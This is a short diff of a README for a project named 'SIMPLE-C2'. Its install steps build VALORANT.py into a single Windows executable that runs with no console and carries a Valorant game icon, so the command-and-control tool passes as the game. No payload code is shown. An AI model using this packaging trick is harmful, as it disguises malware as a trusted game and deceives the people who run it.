@@ -3,7 +3,9 @@ SIMPLE-C2
 Install:
 
 pip install -r requirements.txt
+
 python -m nuitka --onefile --windows-console-mode=disable --windows-icon-from-ico=valorant.ico VALORANT.py
+
 move dist\VALORANT.exe ..
 
 Usage:
